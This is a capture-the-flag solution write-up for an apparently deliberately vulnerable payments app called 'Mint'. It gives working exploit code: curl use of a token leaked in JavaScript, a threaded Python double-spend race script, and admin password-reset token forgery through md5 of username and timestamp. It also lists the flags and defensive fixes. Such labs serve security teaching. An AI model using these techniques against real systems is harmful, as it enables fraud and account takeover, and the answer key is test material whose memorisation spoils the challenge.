# Mint — Solution

## Flag 1: JavaScript Source Review → Hidden Diagnostics Endpoint

**Vulnerability:** Internal endpoint and authentication token left in
client-side JavaScript.

### Discovery

The app loads `/static/app.js`. Reading the source reveals a
`_initDiagnostics()` function:

```javascript
function _initDiagnostics() {
  if (window.__MINT_DEV__) {
    fetch('/api/internal/diagnostics', {
      headers: {
        'X-Diag-Token': 'mint-internal-2026',
        'Accept': 'application/json'
      }
    })...
  }
}
```

### Exploit

```bash
curl -s http://localhost:8100/static/app.js | grep -A5 diagnostics

curl http://localhost:8100/api/internal/diagnostics \
  -H "X-Diag-Token: mint-internal-2026" | python3 -m json.tool
```

**Flag:** `FLAG{h1dd3n_3ndp01nt_js_s0urc3_r3v13w}`

The response also reveals:
- Transfer engine has a "non-atomic balance check" (race condition hint)
- Reset service uses "simplified token generation"

---

## Flag 2: Race Condition (TOCTOU) — Double Spend

**Vulnerability:** Time-of-check/time-of-use gap in the transfer
endpoint. The balance is checked, then there's a processing delay, then
the deduction happens. Concurrent requests all pass the check before any
deduction occurs.

### Setup

Create two accounts:

```bash
# Account 1 — the sender
curl -X POST http://localhost:8100/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'

# Account 2 — the receiver
curl -X POST http://localhost:8100/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"bob123"}'
```

### Exploit

Login as alice and send many concurrent transfers to bob:

```python
import requests
import threading

BASE = "http://localhost:8100"

# Login as alice and get session cookie
s = requests.Session()
s.post(f"{BASE}/api/login",
       json={"username": "alice", "password": "alice123"})

results = []

def transfer():
    r = s.post(f"{BASE}/api/transfer",
               json={"to": "bob", "amount": 500})
    results.append(r.json())

# Send 30 concurrent transfers of 500 MC each
threads = [threading.Thread(target=transfer) for _ in range(30)]
for t in threads:
    t.start()
for t in threads:
    t.join()

success = sum(1 for r in results if r.get("ok"))
print(f"{success} transfers succeeded out of 30")
```

All 30 threads check alice's balance (500 MC) at roughly the same time,
all see 500 ≥ 500, all proceed. Bob ends up with 500 + (N × 500) MC
where N is the number that passed.

### Buy Premium

Login as bob and buy Premium Status (10,000 MC):

```bash
# Login as bob
curl -c cookies.txt -X POST http://localhost:8100/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"bob123"}'

# Buy Premium
curl -b cookies.txt -X POST http://localhost:8100/api/buy-premium \
  -H "Content-Type: application/json" -d '{}'
```

Visit http://localhost:8100/premium (logged in as bob).

**Flag:** `FLAG{r4c3_c0nd1t10n_d0ubl3_sp3nd}`

The Premium page reveals: the password reset uses `md5` over predictable
inputs (username + timestamp), and the API leaks the timestamp.

---

## Flag 3: Predictable Token Forgery → Admin Account Takeover

**Vulnerability:** Password reset tokens are generated as
`md5(username + str(unix_timestamp))`. The timestamp is returned in
the API response's `requested_at` field.

### Exploit

```python
import requests
import hashlib

BASE = "http://localhost:8100"

# Request a password reset for admin
r = requests.post(f"{BASE}/api/forgot-password",
                  json={"username": "admin"})
data = r.json()
ts = data["requested_at"]
print(f"Timestamp: {ts}")

# Forge the token using the same algorithm the server uses
token = hashlib.md5(f"admin{ts}".encode()).hexdigest()
print(f"Forged token: {token}")

# Reset admin's password
r = requests.post(f"{BASE}/api/reset-password",
                  json={"token": token, "password": "hacked"})
print(r.json())

# Login as admin
s = requests.Session()
r = s.post(f"{BASE}/api/login",
           json={"username": "admin", "password": "hacked"})
print(r.json())

# Access the vault
r = s.get(f"{BASE}/admin/vault")
print(r.text)
```

**Flag:** `FLAG{pr3d1ct4bl3_t0k3n_4cc0unt_t4k30v3r}`

---

## Defense

1. **Never ship internal endpoints or secrets in client-side code.**
   Use server-side configuration, environment variables, and proper
   access control. Strip debug code before deployment.

2. **Make financial operations atomic.** Use database transactions with
   `SELECT ... FOR UPDATE` (row locking) so the check and deduction
   happen as one indivisible operation. No concurrent request can read
   a stale balance.

3. **Use cryptographically random tokens.** Python's `secrets` module
   (`secrets.token_urlsafe()`) generates unpredictable tokens. Never
   derive security tokens from predictable inputs like timestamps,
   usernames, or sequential IDs.
